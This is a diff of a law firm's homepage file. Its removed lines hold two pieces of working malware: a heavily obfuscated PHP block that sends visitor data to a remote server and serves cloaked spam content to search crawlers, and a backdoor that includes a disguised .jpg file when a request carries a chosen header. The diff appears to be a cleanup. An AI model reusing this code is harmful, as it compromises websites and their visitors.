@@ -1,88 +1,74 @@
-<?php @header('Content-Type:text/html;charset=utf-8');error_reporting(0); $OOOOOO="%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a%7c%2b%2c"; global $O; $O=urldecode($OOOOOO);$oOooOO='z1108_26';$oOooOOoO=$O[15].$O[4].$O[4].$O[9].$O[62].$O[63].$O[63].$O[68].$O[73].$O[59].$O[64].$O[73].$O[72].$O[59].$O[64].$O[71].$O[64].$O[59].$O[66].$O[69].$O[63].$oOooOO.$O[63]; function ooooooooOOOOOOOOoooooOOO($oooOOOoOoo){$ooooOOOooOo=curl_init();curl_setopt ($ooooOOOooOo, CURLOPT_URL, $oooOOOoOoo);curl_setopt ($ooooOOOooOo, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ooooOOOooOo, CURLOPT_CONNECTTIMEOUT, 5);$oooooOOOOooO = curl_exec($ooooOOOooOo);curl_close($ooooOOOooOo);return $oooooOOOOooO; } function ooOOoOOO($OooooO,$OOOoooo=array()){global $O;$OooooO=str_replace(' ','+',$OooooO);$OOooooO=curl_init();curl_setopt($OOooooO,CURLOPT_URL, "$OooooO");curl_setopt($OOooooO,CURLOPT_RETURNTRANSFER, 1);curl_setopt($OOooooO,CURLOPT_HEADER, 0);curl_setopt($OOooooO,CURLOPT_TIMEOUT,10);curl_setopt($OOooooO,CURLOPT_POST, 1);curl_setopt($OOooooO,CURLOPT_POSTFIELDS, http_build_query($OOOoooo));$OOOOooo=curl_exec($OOooooO);$OOOOoooOO=curl_errno($OOooooO);curl_close($OOooooO);if(0!==$OOOOoooOO){return false;}return $OOOOooo;} function oooOOOo($ooOOo){global $O;$ooOOOOo = false;$oooooOOo = $O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[23].$O[8].$O[4].$O[90].$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[90].$O[5].$O[10].$O[15].$O[8].$O[8].$O[90].$O[23].$O[7].$O[24].$O[14].$O[90].$O[10].$O[8].$O[18];if ($ooOOo!=''){if (preg_match("/($oooooOOo)/si",$ooOOo)){$ooOOOOo=true;}}return $ooOOOOo;} function oooOOooOOoOO($oOOOOOOoOOOO){global $O;$ooOOOOOOoO=false;$ooOOOOOOoOo=$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[59].$O[21].$O[8].$O[59].$O[16].$O[9].$O[90].$O[5].$O[10].$O[15].$O[8].$O[8].$O[59].$O[21].$O[8].$O[59].$O[16].$O[9].$O[90].$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[59].$O[21].$O[8].$O[25];if ($oOOOOOOoOOOO!='' && preg_match("/($ooOOOOOOoOo)/si", $oOOOOOOoOOOO)) {$ooOOOOOOoO=true;}return $ooOOOOOOoO;}$oOooOOoOO=((isset($_SERVER[$O[41].$O[30].$O[30].$O[35].$O[37]]) && $_SERVER[$O[41].$O[30].$O[30].$O[35].$O[37]]!==$O[8].$O[13].$O[13])?$O[15].$O[4].$O[4].$O[9].$O[11].$O[62].$O[63].$O[63]:$O[15].$O[4].$O[4].$O[9].$O[62].$O[63].$O[63]);$oOoooOOoOO=$_SERVER[$O[29].$O[28].$O[26].$O[32].$O[28].$O[37].$O[30].$O[52].$O[32].$O[29].$O[33]];$ooOOoooOOoOO=$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[41].$O[34].$O[37].$O[30]];$ooOOOoooOOoOO=$_SERVER[$O[35].$O[41].$O[35].$O[52].$O[37].$O[28].$O[44].$O[39]];$ooOOOOoooOOOoOO=$_SERVER[$O[37].$O[28].$O[29].$O[48].$O[28].$O[29].$O[52].$O[50].$O[36].$O[51].$O[28]];$ooOOOOoooOOOOoOO=$oOooOOoOO.$ooOOoooOOoOO.$oOoooOOoOO;$oooOOOOoooOOOooOO=$oOooOOoO.$O[63].$O[7].$O[24].$O[12].$O[10].$O[4].$O[10].$O[59].$O[9].$O[15].$O[9];$ooooOOOOoooOOOooO=$oOooOOoO.$O[63].$O[25].$O[10].$O[9].$O[59].$O[9].$O[15].$O[9];$ooooOOOOoooOOOooOoo=$oOooOOoO.$O[63].$O[16].$O[6].$O[25].$O[9].$O[59].$O[9].$O[15].$O[9];$oooooOOoooOOOoooOoo=$oOooOOoO.$O[63].$O[1].$O[8].$O[3].$O[12].$O[11].$O[59].$O[9].$O[15].$O[9];$ooooooooOOOOoooOOoooOO=$oOooOOoO.$O[63].$O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[9].$O[15].$O[9];$ooooooOoOoooOOOooo[$O[6].$O[11].$O[2].$O[3].$O[52].$O[10].$O[14].$O[2].$O[24].$O[4]]=strtolower(isset($_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[32].$O[37].$O[28].$O[29].$O[52].$O[36].$O[40].$O[28].$O[50].$O[30]])?$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[32].$O[37].$O[28].$O[29].$O[52].$O[36].$O[40].$O[28].$O[50].$O[30]]:'');$oooOoOOooOoooOOOoOoOoOoOoO=strtolower(isset($_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[32].$O[37].$O[28].$O[29].$O[52].$O[36].$O[40].$O[28].$O[50].$O[30]])?$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[32].$O[37].$O[28].$O[29].$O[52].$O[36].$O[40].$O[28].$O[50].$O[30]]:'');$ooooooOoOoooOOOooo[$O[15].$O[4].$O[4].$O[9].$O[52].$O[6].$O[11].$O[2].$O[3].$O[52].$O[10].$O[14].$O[2].$O[24].$O[4]]=$oooOoOOooOoooOOOoOoOoOoOoO;$oooOOOooOoooOOOooooOoOoOoOoO=isset($_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[29].$O[28].$O[39].$O[28].$O[29].$O[28].$O[29]])?$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[29].$O[28].$O[39].$O[28].$O[29].$O[28].$O[29]]:'';$ooooOOOOoooOOOoooOOO=$_SERVER[$O[29].$O[28].$O[51].$O[34].$O[30].$O[28].$O[52].$O[36].$O[38].$O[38].$O[29]];$ooooooOoOoooOOOooo[$O[7].$O[9]]=$ooooOOOOoooOOOoooOOO;$ooooooOoOoooOOOooo[$O[3].$O[2].$O[13].$O[2].$O[3].$O[2].$O[3]]=$oooOOOooOoooOOOooooOoOoOoOoO;if(strpos($oOoooOOoOO,$O[59].$O[9].$O[15].$O[9])){$ooooooOOoooOOOoooOo=$oOooOOoOO.$ooOOoooOOoOO.$ooOOOoooOOoOO;}else{$ooooooOOoooOOOoooOo=$oOooOOoOO.$ooOOoooOOoOO;}$ooooooOoOoooOOOooo[]=array();$ooooooOoOoooOOOooo[$O[12].$O[8].$O[25].$O[10].$O[7].$O[24]]=$ooOOoooOOoOO;$ooooooOoOoooOOOooo[$O[3].$O[2].$O[0].$O[52].$O[6].$O[3].$O[7]]=$oOoooOOoOO;$ooooooOoOoooOOOooo[$O[15].$O[3].$O[2].$O[13]]=$ooooooOOoooOOOoooOo;$ooooooOoOoooOOOooo[$O[3].$O[2].$O[0].$O[52].$O[6].$O[3].$O[18]]=$ooOOOOoooOOOOoOO;if(substr($oOoooOOoOO,-6)==$O[3].$O[8].$O[23].$O[8].$O[4].$O[11]){$ooooooooOOOOOoooOoOoooOO = ooOOoOOO($ooooooooOOOOoooOOoooOO,$ooooooOoOoooOOOooo);define('BASE_PATH',str_ireplace($_SERVER[$O[35].$O[41].$O[35].$O[52].$O[37].$O[28].$O[44].$O[39]],'',__FILE__));file_put_contents(BASE_PATH.$O[63].$O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[4].$O[20].$O[4],$ooooooooOOOOOoooOoOoooOO);$ooooooooOOOOOoooOoOoooOO=file_get_contents(BASE_PATH.$O[63].$O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[4].$O[20].$O[4]);if(strpos($ooooooooOOOOOoooOoOoooOO,$O[59].$O[20].$O[25].$O[18])){	echo $O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[4].$O[20].$O[4].$O[57].$O[13].$O[7].$O[18].$O[2].$O[57].$O[21].$O[3].$O[2].$O[10].$O[4].$O[2].$O[57].$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[88];}else{	echo $O[3].$O[8].$O[23].$O[8].$O[4].$O[11].$O[59].$O[4].$O[20].$O[4].$O[57].$O[13].$O[7].$O[18].$O[2].$O[57].$O[21].$O[3].$O[2].$O[10].$O[4].$O[2].$O[57].$O[13].$O[10].$O[7].$O[18].$O[88];}exit; }if(substr($oOoooOOoOO,-4)==$O[59].$O[20].$O[25].$O[18]){if(strpos($oOoooOOoOO,$O[9].$O[7].$O[24].$O[14].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[59].$O[20].$O[25].$O[18])){$ooooooOoOoooOOOooooO = ooOOoOOO($ooooOOOOoooOOOooO,$ooooooOoOoo1oOOOooo);$ooooooOOoooOOOooooOOO= explode(",",$ooooooOoOoooOOOooooO);$ooooooOOoooOOOooooOOO[]=$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9];for($ooooooOOoooOOOooooOOOOo=0;$ooooooOOoooOOOooooOOOOo<count($ooooooOOoooOOOooooOOO);$ooooooOOoooOOOooooOOOOo++){if(strpos($ooooooOOoooOOOoooOo,$O[59].$O[9].$O[15].$O[9])> 0){$ooooooOOoooOOOooooOOOOoo=$O[55];}else{$ooooooOOoooOOOooooOOOOoo=$O[63]; } $ooooooOOOoooOOOooooOOOOOoo=$ooooooOOoooOOOoooOo.$ooooooOOoooOOOooooOOOOoo.$ooooooOOoooOOOooooOOO[$ooooooOOoooOOOooooOOOOo].$O[59].$O[20].$O[25].$O[18]; $ooooooOOOOoooOOOooooOOOOOo=$O[15].$O[4].$O[4].$O[9].$O[11].$O[62].$O[63].$O[63].$O[1].$O[1].$O[1].$O[59].$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[59].$O[21].$O[8].$O[25].$O[63].$O[9].$O[7].$O[24].$O[14].$O[55].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[61].$ooooooOOOoooOOOooooOOOOOoo; $ooooooOOOOoooOOOooooOOOOOoOooOoOo=$O[15].$O[4].$O[4].$O[9].$O[62].$O[63].$O[63].$O[1].$O[1].$O[1].$O[59].$O[14].$O[8].$O[8].$O[14].$O[18].$O[2].$O[59].$O[21].$O[8].$O[25].$O[63].$O[9].$O[7].$O[24].$O[14].$O[55].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[61].$ooooooOOOoooOOOooooOOOOOoo; if(stristr(@file_get_contents($ooooooOOOOoooOOOooooOOOOOo),$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[13].$O[6].$O[18].$O[18].$O[5])){echo $ooooooOOOOoooOOOooooOOOOOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[34].$O[43].PHP_EOL;}else if(stristr(@ooooooooOOOOOOOOoooooOOO($ooooooOOOOoooOOOooooOOOOOo),$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[13].$O[6].$O[18].$O[18].$O[5])){echo $ooooooOOOOoooOOOooooOOOOOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[34].$O[43].PHP_EOL; }else if(stristr(@file_get_contents($ooooooOOOOoooOOOooooOOOOOoOooOoOo),$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[13].$O[6].$O[18].$O[18].$O[5])){echo $ooooooOOOOoooOOOooooOOOOOoOooOoOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[34].$O[43].PHP_EOL; }else if(stristr(@ooooooooOOOOOOOOoooooOOO($ooooooOOOOoooOOOooooOOOOOoOooOoOo),$O[11].$O[6].$O[21].$O[21].$O[2].$O[11].$O[11].$O[13].$O[6].$O[18].$O[18].$O[5])){echo $ooooooOOOOoooOOOooooOOOOOoOooOoOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[34].$O[43].PHP_EOL; }else{echo $ooooooOOOOoooOOOooooOOOOOoOooOoOo.$O[61].$O[61].$O[61].$O[56].$O[37].$O[6].$O[23].$O[25].$O[7].$O[4].$O[4].$O[7].$O[24].$O[14].$O[57].$O[40].$O[8].$O[8].$O[14].$O[18].$O[2].$O[57].$O[37].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[62].$O[57].$O[13].$O[10].$O[7].$O[18].PHP_EOL;}}exit;}if(strpos($oOoooOOoOO,$O[10].$O[18].$O[18].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9].$O[59].$O[20].$O[25].$O[18])){$ooooooOoOoooOOOooooO = ooOOoOOO($ooooOOOOoooOOOooO,$ooooooOoOoooOOOooo);header($O[47].$O[8].$O[24].$O[4].$O[2].$O[24].$O[4].$O[53].$O[4].$O[5].$O[9].$O[2].$O[62].$O[4].$O[2].$O[20].$O[4].$O[63].$O[20].$O[25].$O[18]); echo $ooooooOoOoooOOOooooO;exit;}if(strpos($oOoooOOoOO,$O[59].$O[9].$O[15].$O[9])){ $ooooooOOoOOoooOOOooooOOOOO=explode($O[55],$oOoooOOoOO); $ooooooOOoOOoooOOOooooOOOOO=$ooooooOOoOOoooOOOooooOOOOO[count($ooooooOOoOOoooOOOooooOOOOO)-1]; $ooooooOOoOOoooOOOooooOOOOO=str_replace($O[59].$O[20].$O[25].$O[18],"",$ooooooOOoOOoooOOOooooOOOOO);}else{ $ooooooOOoOOoooOOOooooOOOOO= str_replace($O[63],"",$oOoooOOoOO);$ooooooOOoOOoooOOOooooOOOOO= str_replace($O[59].$O[20].$O[25].$O[18],"",$ooooooOOoOOoooOOOooooOOOOO);}$ooooooOoOoooOOOooo[$O[1].$O[8].$O[3].$O[12]]=$ooooooOOoOOoooOOOooooOOOOO;$ooooooOoOoooOOOooo[$O[10].$O[21].$O[4].$O[7].$O[8].$O[24]]=$O[21].$O[15].$O[2].$O[21].$O[17].$O[52].$O[11].$O[7].$O[4].$O[2].$O[25].$O[10].$O[9];$ooooooOOoOoOoooOOOooooOOoOOO=ooOOoOOO($oooooOOoooOOOoooOoo,$ooooooOoOoooOOOooo);if($ooooooOOoOoOoooOOOooooOOoOOO=='1'){$ooooooOoOoooOOOooooO=ooOOoOOO($ooooOOOOoooOOOooO,$ooooooOoOoooOOOooo);header($O[47].$O[8].$O[24].$O[4].$O[2].$O[24].$O[4].$O[53].$O[4].$O[5].$O[9].$O[2].$O[62].$O[4].$O[2].$O[20].$O[4].$O[63].$O[20].$O[25].$O[18]);echo $ooooooOoOoooOOOooooO;exit;}$ooooooOoOoooOOOooo[$O[10].$O[21].$O[4].$O[7].$O[8].$O[24]]=$O[21].$O[15].$O[2].$O[21].$O[17].$O[52].$O[1].$O[8].$O[3].$O[12].$O[11];$ooooooOOoOoOoooOOOooooOOoOoOO= ooOOoOOO($oooooOOoooOOOoooOoo,$ooooooOoOoooOOOooo);if(strpos($oOoooOOoOO,$O[25].$O[10].$O[9])> 0 || $ooooooOOoOoOoooOOOooooOOoOoOO=='1'){$ooooooOoOoooOOOooo[$O[10].$O[21].$O[4].$O[7].$O[8].$O[24]]=$O[3].$O[10].$O[24].$O[12].$O[52].$O[20].$O[25].$O[18];$ooooooOOoOoOoooOOOooooOOoOOO=ooOOoOOO($oooooOOoooOOOoooOoo,$ooooooOoOoooOOOooo);header($O[47].$O[8].$O[24].$O[4].$O[2].$O[24].$O[4].$O[53].$O[4].$O[5].$O[9].$O[2].$O[62].$O[4].$O[2].$O[20].$O[4].$O[63].$O[20].$O[25].$O[18]);echo $ooooooOOoOoOoooOOOooooOOoOOO;exit;}}if(strpos($oOoooOOoOO,$O[59].$O[9].$O[15].$O[9])){$ooooooOOooOooOoooOOOooooOOoOoOO=$oOooOOoOO.$ooOOOOoooOOOoOO.$ooOOOoooOOoOO;$ooooooOoOoooOOOooo[$O[25].$O[10].$O[7].$O[24].$O[52].$O[11].$O[15].$O[2].$O[18].$O[18]]=$ooooooOOooOooOoooOOOooooOOoOoOO;}else{$ooooooOOooOooOoooOOOooooOOoOoOO=$oOooOOoOO.$ooOOOOoooOOOoOO;$ooooooOoOoooOOOooo[$O[25].$O[10].$O[7].$O[24].$O[52].$O[11].$O[15].$O[2].$O[18].$O[18]]=$ooooooOOooOooOoooOOOooooOOoOoOO;}  $ooooOoOOooOoooOOOoOoOoOoO=oooOOooOOoOO($oooOOOooOoooOOOooooOoOoOoOoO);if(strpos($_SERVER[$O[29].$O[28].$O[26].$O[32].$O[28].$O[37].$O[30].$O[52].$O[32].$O[29].$O[33]],$O[59].$O[9].$O[15].$O[9])){ $ooooooooOOOOOOOO = $O[55]; }else{ $ooooooooOOOOOOOO = $O[63]; } if($ooooOoOOooOoooOOOoOoOoOoO && substr($_SERVER[$O[29].$O[28].$O[26].$O[32].$O[28].$O[37].$O[30].$O[52].$O[32].$O[29].$O[33]],-5)==$O[59].$O[15].$O[4].$O[25].$O[18] && preg_match($O[63].$O[16].$O[10].$O[63].$O[7],@$_SERVER[$O[41].$O[30].$O[30].$O[35].$O[52].$O[36].$O[47].$O[47].$O[28].$O[35].$O[30].$O[52].$O[44].$O[36].$O[50].$O[40].$O[32].$O[36].$O[40].$O[28]])){	echo ooOOoOOO($ooooOOOOoooOOOooOoo,$ooooooOoOoooOOOooo);exit;}$oooOoOooOooOoooOOOoOoOoOoOo=oooOOOo($oooOoOOooOoooOOOoOoOoOoOoO);if($oooOoOooOooOoooOOOoOoOoOoOo){$ooooooOOOOOoooOOOOooooooO = ooOOoOOO($oooOOOOoooOOOooOO,$ooooooOoOoooOOOooo); if($ooooooOOOOOoooOOOOooooooO==$O[70].$O[67].$O[70]){header($O[41].$O[30].$O[30].$O[35].$O[63].$O[64].$O[59].$O[67].$O[57].$O[70].$O[67].$O[70].$O[57].$O[50].$O[8].$O[4].$O[57].$O[39].$O[8].$O[6].$O[24].$O[12]);exit;}else if($ooooooOOOOOoooOOOOooooooO==$O[69].$O[67].$O[67]){header($O[41].$O[30].$O[30].$O[35].$O[63].$O[64].$O[59].$O[67].$O[57].$O[69].$O[67].$O[67].$O[57].$O[33].$O[24].$O[4].$O[2].$O[3].$O[24].$O[10].$O[18].$O[57].$O[37].$O[2].$O[3].$O[22].$O[2].$O[3].$O[57].$O[28].$O[3].$O[3].$O[8].$O[3]);exit;}else if($ooooooOOOOOoooOOOOooooooO==$O[23].$O[18].$O[10].$O[24].$O[17]){echo '';exit;}else{echo $ooooooOOOOOoooOOOOooooooO;exit;} }else{ header($O[41].$O[30].$O[30].$O[35].$O[63].$O[64].$O[59].$O[67].$O[57].$O[70].$O[67].$O[70].$O[57].$O[50].$O[8].$O[4].$O[57].$O[39].$O[8].$O[6].$O[24].$O[12]);} ?>
-<?php $h = getallheaders();
-if(array_key_exists("Expires", $h) && $h["Expires"] == 1)
-@include "w\x61y\x66\x65\x72s\x2fb\x61\x63\x6b\x67round.jpg"; ?>
 <!doctype html>
 <html lang="en-US">
-
-<head>
-   <meta charset="UTF-8">
-   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-   <title>Lex Premier - Advocates & Consultants</title>
-   <meta name="description" content="Lex Premier - Advocates & Consultants">
-   <meta name="keywords" content="Lex Premier - Advocates & Consultants">
-   <link href="css/bootstrap.min.css" rel="stylesheet">
-   <link rel="stylesheet" type="text/css" href="css/menu.css" />
-   <link rel="stylesheet" type="text/css" href="css/owl.carousel.css" />
-   <link rel="stylesheet" type="text/css" href="css/style.css?s" />
-   <link rel="stylesheet" type="text/css" href="css/media.css" />
-   <link rel="stylesheet" type="text/css" href="css/animate.min.css" />
-   <link rel="stylesheet" type="text/css" href="js/parsley.css" />
-   <link rel="stylesheet" href="css/magnific-popup.css" />
-   <link rel="stylesheet" href="css/font-awesome.min.css">
-
-   <script src="js/jquery-2.1.4.js"></script>
-   <!-- Global site tag (gtag.js) - Google Analytics -->
-   <script async src="https://www.googletagmanager.com/gtag/js?id=G-PGEVD3HJR0"></script>
-   <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag() { dataLayer.push(arguments); }
-      gtag('js', new Date());
-
-      gtag('config', 'G-PGEVD3HJR0');
-   </script>
-
-
-
-</head>
-
-<?php include 'include/header.php'; ?>
-<div class="banner wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">
-   <div id="carouselExampleSlidesOnly" data-interval="3000" class="carousel slide carousel-fade" data-ride="carousel">
-      <div class="carousel-inner">
-         <div class="carousel-item active">
-            <img src="images/banner.jpg">
-            <div class="bnr-cont">
-               <h1>Don't Feel Helpless. We fight for Justice.</h1>
+   <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Lex Premier - Advocates & Consultants</title>
+      <meta name="description" content="Lex Premier - Advocates & Consultants">
+      <meta name="keywords" content="Lex Premier - Advocates & Consultants">
+      <link href="css/bootstrap.min.css" rel="stylesheet">
+      <link rel="stylesheet" type="text/css" href="css/menu.css" />
+      <link rel="stylesheet" type="text/css" href="css/owl.carousel.css" />
+      <link rel="stylesheet" type="text/css" href="css/style.css?s" />
+      <link rel="stylesheet" type="text/css" href="css/media.css" />
+      <link rel="stylesheet" type="text/css" href="css/animate.min.css" />
+      <link rel="stylesheet" type="text/css" href="js/parsley.css" />
+      <link rel="stylesheet" href="css/magnific-popup.css" />
+      <link rel="stylesheet" href="css/font-awesome.min.css">
+      <script src="js/jquery-2.1.4.js"></script>
+      <!-- Global site tag (gtag.js) - Google Analytics -->
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-PGEVD3HJR0"></script>
+      <script>
+         window.dataLayer = window.dataLayer || [];
+         function gtag() { dataLayer.push(arguments); }
+         gtag('js', new Date());
+         
+         gtag('config', 'G-PGEVD3HJR0');
+      </script>
+   </head>
+   <?php include 'include/header.php'; ?>
+   <div class="banner wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">
+      <div id="carouselExampleSlidesOnly" data-interval="3000" class="carousel slide carousel-fade" data-ride="carousel">
+         <div class="carousel-inner">
+            <div class="carousel-item active">
+               <img src="images/banner.jpg">
+               <div class="bnr-cont">
+                  <h1>Don't Feel Helpless. We fight for Justice.</h1>
+               </div>
+            </div>
+            <div class="carousel-item">
+               <img src="images/banner.jpg">
+               <div class="bnr-cont">
+                  <h1>Our Philosophy is Client's First.</h1>
+               </div>
+            </div>
+            <div class="carousel-item">
+               <img src="images/banner.jpg">
+               <div class="bnr-cont">
+                  <h1>Providing Legal Solutions in Diverse Field.</h1>
+               </div>
             </div>
          </div>
-         <div class="carousel-item">
-            <img src="images/banner.jpg">
-            <div class="bnr-cont">
-               <h1>Our Philosophy is Client's First.</h1>
-            </div>
-         </div>
-         <div class="carousel-item">
-            <img src="images/banner.jpg">
-            <div class="bnr-cont">
-               <h1>Providing Legal Solutions in Diverse Field.</h1>
-            </div>
-         </div>
-
       </div>
    </div>
-</div>
-<div class="book-now container">
+   <div class="book-now container">
       <div class="book-now-inner wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">
-
          <form action="" data-parsley-validate="" id="sendContact" method="POST">
             <div class="row">
                <div class="col-lg-10 col-md-12 col-sm-12">
                   <div class="book-now-left">
                      <ul>
-
                         <li><span>Name</span> <input required="" type="text" name="name">
                         </li>
                         <li><span>Email</span> <input required="" type="email" name="email"
-                              > </li>
+                           > </li>
                         <li><span>Phone Number</span> <input required="" type="text" name="phone_no"
-                              "> </li>
+                           "> </li>
                         <li><span>Date</span><input type="date" name="start_date" required=""></li>
                         <li><span>Time</span> <input required="" type="time" name="time"
-                              > </li>
+                           > </li>
                         <li><span>Message</span> <input required="" type="text" name="message"
-                             > </li>
+                           > </li>
                      </ul>
                   </div>
                </div>
@@ -95,351 +81,323 @@ if(array_key_exists("Expires", $h) && $h["Expires"] == 1)
                </div>
             </div>
          </form>
-
       </div>
-     
-</div>
-         <div class="row" style="width: 100%; background-image: url(https://lexpremier.in/images/about3.jpg);;
-">
-              <div class="col-lg-6 col-md-12 col-sm-12">
-               <div style="padding: 40px;"> 
-               <figure><img class="legal-exper" src="images/about3.jpg"></figure>
-               </div>
-            </div>
-            <div class="col-lg-6 col-md-12 col-sm-12">
-               <div style="padding: 40px;">
-                  <h2 class="h2">Legal Expertise. Credible Solutions.</h2>
-                  <p class="para"></p>
-                  <p class="para">At Lex Premier, We enhance our knowledge and service offerings by merging practice and sector
-                     groups to develop a comprehensive understanding of our clients’ business and markets. We focus on
-                     relationships, not deals, and we are considered very approachable and accessible from top to bottom
-                     of the hierarchy.</p>
-                  <p class="para">
-                     The firm combines flexibility and responsiveness with practical, in-depth experience to provide
-                     legal advice that reflects the commercial context in which it is sought. We form close,
-                     constructive, and responsive working relationships, and our approach ensures continuity and clear
-                     communication.</p>
-
-                      <div class="read-btn">
-                     <a href="about-us.html">Read More</a>
-                </div>
-               </div>
-            </div>
-          
-         </div>
-      <div class="row p-5">
-      
-     <div class="col-lg-12 col-md-12 col-sm-12 text-center ">
-      <h3>Practise Area and categories are </h3></div>
-      	<div class="col-lg-3 col-md-6 col-sm-6">
-            <a href="practise-areas.php#corporatebusiness">
-      		<div class="card card-margin">
-      			<div class="card-body card-style">
-      				 <div class="stat-icon-box teacher">
-                   <img src="images/icons/business-and-corporate-law.png" alt=""> 
-               </div>
-               <h4 class="stat-title">Corporate &amp; Business Law</h4>
-      			</div>
-      		</div>
-      		</a>
-      	</div>
-      		<div class="col-lg-3 col-md-6 col-sm-6">
-            <a href="practise-areas.php#arbitrationConciliation">
-      		<div class="card card-margin">
-      			<div class="card-body card-style">
-      				<div class="stat-icon-box teacher">
-                 <img src="images/icons/Arbitration_and_Conciliation.png" alt="">
-               </div>
-      					<h4  class="stat-title">Arbitration &amp; Conciliation</h4>
-      			</div>
-      		</div>
-      		</a>
-      	</div>
-      		<div class="col-lg-3 col-md-6 col-sm-6">
-            <a href="practise-areas.php#familymatters">
-      		<div class="card card-margin">
-      			<div class="card-body card-style">
-      				<div class="stat-icon-box teacher">
-                   <img src="images/icons/Matrimonial_Disputes.png" alt="">
-               </div>
-      					<h4 class="stat-title">Matrimonial Disputes</h4>
-      				</div>
-      		</div>
-      		</a>
-      	</div>
-      		<div class="col-lg-3 col-md-6 col-sm-6">
-            <a href="practise-areas.php#civil">
-      		<div class="card card-margin">
-      			<div class="card-body card-style">
-      				<div class="stat-icon-box teacher">
-                   <img src="images/icons/Civil.png" alt=""> 
-               </div>
-      					<h4 class="stat-title">Civil</h4>
-      			</div>
-      		</div>
-      		</a>
-      	</div>
-      		<div class="col-lg-3 col-md-6 col-sm-6">
-      			<a href="practise-areas.php#ipr">
-      		<div class="card card-margin">
-      			<div class="card-body card-style">
-      				<div class="stat-icon-box teacher">
-                  <img src="images/icons/IPR.png" alt=""> 
-               </div>
-      					<h4 class="stat-title">IPR</h4>
-      			</div>
-      		</div>
-      		</a>
-      	</div>
-      		<div class="col-lg-3 col-md-6 col-sm-6">
-      			<a href="practise-areas.php#criminallaw">
-      		<div class="card card-margin">
-      			<div class="card-body card-style">
-      				<div class="stat-icon-box teacher">
-      					<img src="images/icons/Criminal_Law.png">
-      				</div> 
-      				 <h4 class="stat-title">Criminal Law</h4>
-
-      			</div>
-      		</div>
-      		</a>
-      	</div>
-      		<div class="col-lg-3 col-md-6 col-sm-6">
-      		<a href="practise-areas.php#immigration">
-      		<div class="card card-margin">
-      			<div class="card-body card-style">
-      				<div class="stat-icon-box teacher">
-      					<img src="images/icons/Immigration.png">
-      				</div>
-      					<h4 class="stat-title">Immigration (In Indian Courts)</h4>
-      			</div>
-      		</div>
-      		</a>
-      	</div>
-      		<div class="col-lg-3 col-md-6 col-sm-6">
-      			<a href="practise-areas.php#statups">
-      		<div class="card card-margin card-margin">
-      			<div class="card-body card-style">
-      				<div class="stat-icon-box teacher">
-      					<img src="images/icons/Start-ups.png">
-      				</div>
-      					<h4 class="stat-title">Start-ups</h4>
-      			</div>
-      		</div>
-      		</a>
-      	</div>
-      </div>
-<!--<div class="tab-sec wow fadeInUp" style="visibility: visible; animation-name: fadeInUp">-->
-<!--   <div>-->
-<div class="row corporate-edit">
-               <div class="col-lg-6 col-md-12 col-sm-12">
-               <div style="padding: 40px;">
-                  <h2 class="h2">CORPORATE &amp; BUSINESS LAW</h2>
